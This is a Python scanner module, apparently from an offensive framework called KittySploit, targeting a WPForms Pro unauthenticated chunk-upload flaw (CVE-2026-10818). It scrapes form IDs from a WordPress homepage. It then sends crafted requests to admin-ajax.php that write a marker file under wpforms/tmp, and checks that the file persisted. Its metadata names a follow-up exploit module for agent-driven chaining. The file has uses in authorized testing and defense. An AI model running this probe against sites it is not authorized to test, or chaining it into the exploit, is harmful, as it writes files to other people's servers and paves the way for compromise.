#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WPForms Pro <= 1.10.1.1 chunk upload (CVE-2026-10818)."""

import hashlib
import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client
from lib.protocols.http.wordpress import Wordpress


class Module(Scanner, Http_client, Wordpress):
    __info__ = {
        "name": "WPForms CVE-2026-10818 upload detect",
        "description": "Detects wpforms-uploader and probes unauthenticated chunk write under wpforms/tmp.",
        "author": ["KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-10818",
        "references": ["https://nvd.nist.gov/vuln/detail/CVE-2026-10818"],
        "modules": ["exploits/multi/http/wpforms_cve_2026_10818_upload"],
        "tags": ["web", "scanner", "wordpress", "wpforms", "upload", "cve-2026-10818"],
        "agent": {
            "approval_required": True,
            "chain": {"suggested_followups": ["exploits/multi/http/wpforms_cve_2026_10818_upload"]},
        },
    }

    base_path = OptString("/", "WordPress base path", required=False)
    upload_probe = OptBool(True, "Run chunk upload probe", required=False)

    def _join(self, suffix: str) -> str:
        base = self.wp_normalize_base_path(self.base_path or "/")
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base != "/" else suffix

    def _scrape(self, html: str):
        fid = re.search(r'data-form-id="(\d+)"', html)
        field = re.search(r'data-field-id="(\d+)"', html)
        inp = re.search(r'data-input-name="([^"]+)"', html)
        if fid and field and inp:
            return fid.group(1), field.group(1), inp.group(1)
        return "", "", ""

    def run(self):
        home = self.http_request(method="GET", path=self._join("/"), allow_redirects=True)
        html = home.text or "" if home else ""
        if "wpforms-uploader" not in html:
            return False
        form_id, field_id, input_name = self._scrape(html)
        if not form_id:
            self.set_info(severity="high", reason="WPForms uploader present", cve="CVE-2026-10818")
            return True
        if not self.upload_probe:
            self.set_info(severity="high", reason="WPForms upload surface scraped", cve="CVE-2026-10818")
            return True
        marker = secrets.token_hex(4)
        dzuuid = secrets.token_hex(8)
        chunk_hash = hashlib.sha1(dzuuid.encode()).hexdigest()
        self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            data={
                "action": "wpforms_upload_chunk_init",
                "form_id": form_id,
                "field_id": field_id,
                "name": f"ks-{marker}.txt",
                "dzuuid": dzuuid,
                "dztotalfilesize": "32",
                "dztotalchunkcount": "1",
            },
            allow_redirects=False,
        )
        bnd = "----WebKitFormBoundaryWP10818"
        parts = [
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nwpforms_upload_chunk\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"form_id\"\r\n\r\n{form_id}\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"field_id\"\r\n\r\n{field_id}\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"dzuuid\"\r\n\r\n{dzuuid}\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"dzchunkindex\"\r\n\r\n0\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"dzchunksize\"\r\n\r\n32\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"dztotalchunkcount\"\r\n\r\n1\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"dzchunkbyteoffset\"\r\n\r\n0\r\n",
            f"--{bnd}\r\nContent-Disposition: form-data; name=\"{input_name}\"; filename=\"ks-{marker}.txt\"\r\n"
            f"Content-Type: text/plain\r\n\r\n{marker}\r\n",
            f"--{bnd}--\r\n",
        ]
        up = self.http_request(
            method="POST",
            path=self._join("/wp-admin/admin-ajax.php"),
            headers={"Content-Type": f"multipart/form-data; boundary={bnd}"},
            data="".join(parts).encode(),
            allow_redirects=False,
        )
        if not up or '"success":true' not in (up.text or ""):
            return False
        hit = self.http_request(
            method="GET",
            path=self._join(f"/wp-content/uploads/wpforms/tmp/{chunk_hash}-0.chunk"),
            allow_redirects=False,
        )
        if hit and marker in (hit.text or ""):
            self.set_info(
                severity="high",
                reason="Unauthenticated wpforms chunk persisted on disk",
                cve="CVE-2026-10818",
            )
            return True
        return False
